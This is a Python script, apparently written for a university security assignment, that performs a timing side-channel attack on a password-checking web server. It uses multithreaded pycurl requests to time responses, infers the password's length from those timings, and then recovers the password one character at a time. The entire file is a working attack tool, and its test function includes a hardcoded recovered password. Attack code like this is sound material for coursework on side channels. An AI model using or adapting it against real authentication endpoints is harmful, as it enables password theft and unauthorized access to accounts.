import http.client
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor
from ThreadSafeCounter import ThreadSafeTimeTracker
from decimal import Decimal, getcontext
import pycurl
import io
import threading

_thread_local = threading.local()

### --- Global Variables --- ###

DIFFICULTY = 5

BASE_URL = "aoi-assignment1.oy.ne.ro"
SERVER_PORT = 8080

CHARSET = "abcdefghijklmnopqrstuvwxyz"

USERNAME = "326529229" # need to recieve

NUMBER_OF_THREADS = 26

PASSWORD = ""
LENGTH = -1

getcontext().prec = 30

### ------------------------- ###

def split_charset():
    """
    this function splits the charset into NUMBER_OF_THREADS parts
    """
    global CHARSET, NUMBER_OF_THREADS
    per_thread = len(CHARSET) // NUMBER_OF_THREADS
    if(len(CHARSET) % NUMBER_OF_THREADS != 0):
        per_thread += 1
    parts = [CHARSET[i:i+per_thread] for i in range(0, len(CHARSET), per_thread)]
    return parts

### ------------------------- ###


def get_curl_instance():
    if not hasattr(_thread_local, 'curl'):
        _thread_local.curl = pycurl.Curl()
        # Ensure connection reuse is allowed (default is reuse; explicit for clarity)
        _thread_local.curl.setopt(pycurl.FORBID_REUSE, 0)
    return _thread_local.curl

def try_pass2(password):
    global USERNAME, DIFFICULTY, BASE_URL, SERVER_PORT
    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
    query_string = urllib.parse.urlencode(params)
    url = f"http://{BASE_URL}:{SERVER_PORT}/?{query_string}"

    # Get persistent curl instance for this thread.
    c = get_curl_instance()
    buffer = io.BytesIO()
    c.setopt(c.URL, url)
    c.setopt(c.WRITEDATA, buffer)
    
    # Optionally adjust timeouts or other performance options here.
    c.perform()

    total_time_sec = c.getinfo(c.TOTAL_TIME)
    http_code = c.getinfo(c.RESPONSE_CODE)
    
    # Reset the curl object for reuse in future calls.
    c.reset()
    
    time_ns = Decimal(total_time_sec) * Decimal(1e9)
    data = int(buffer.getvalue().decode('utf-8')) == 1
    
    return {"Status": http_code, "Reason": "", "Time": time_ns, "Data": data}

### ------------------------- ###


def crack_password_length():
    # to warm up the connection
    try_pass2("!")
    maxTime = 0
    length=-1
    for l in range(33):
        result = try_pass2("a" * l)
        if(result.get("Time") > maxTime):
            maxTime = result.get("Time")
            length=l
    return length


### ------------------------- ###

def num_repetitions(discovered_length):
    """
    this function returns the number of repetitions needed for each char
    """
    global LENGTH
    return int(discovered_length/3) + DIFFICULTY + 1


def crack_next_char(discovered_length, executor):
    global NUMBER_OF_THREADS
    r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
    counter = ThreadSafeTimeTracker()
    parts = split_charset()
    for i in range(r):
        futures = []
        for part in parts:
            futures.append(executor.submit(worker, part, discovered_length, counter))
        # Wait for all threads to complete
        for future in futures:
            future.result()
    return counter.get_max_letter()
    


def worker(chars, discovered_length, counter):
    global PASSWORD, LENGTH
    # to warm up the connection
    try_pass2("!")
    if LENGTH - discovered_length == 1:
        for char in chars:
            result = try_pass2(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            if result.get("Data"):
                counter.record_time(char, result.get("Time"))
    else:
        for char in chars:
            result = try_pass2(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            counter.record_time(char, result.get("Time"))


### ------------------------- ###

def main():
    global PASSWORD, LENGTH
    start = time.process_time()
    # first step - exploit the server's length validation
    LENGTH = crack_password_length()
    print(f"Password length: {LENGTH}")
    # second step - crack the password char by char
    discovered_length = 0
    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
        while len(PASSWORD) < LENGTH:
            PASSWORD += crack_next_char(discovered_length, executor)
            discovered_length += 1
            print(f"Password so far: {PASSWORD}")
    end = time.process_time()
    print("-------------------")
    print(try_pass2(PASSWORD))
    print(f"total time took: {end-start}")
        
def test():
    print(try_pass2("usobopdjrcvbvmfz"))

if __name__ == '__main__':
    main()
